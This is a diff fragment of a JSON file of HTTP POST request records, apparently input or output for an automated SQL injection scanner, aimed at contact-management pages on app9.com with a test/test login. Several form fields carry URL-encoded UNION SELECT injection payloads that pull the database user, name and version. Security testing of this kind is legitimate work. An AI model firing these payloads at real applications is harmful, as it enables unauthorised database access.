+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/newContacts?Contacts_sort=phone.desc", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/newContacts?Contacts_sort=leadstatus.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/newContacts?Contacts_sort=leadSource.desc", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/newContacts?Contacts_sort=leadSource.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/myContacts?Contacts_sort=leadstatus.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/myContacts?Contacts_sort=leadstatus.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/myContacts?Contacts_sort=email.desc", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/newContacts?Contacts_sort=name.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
   }
 ]
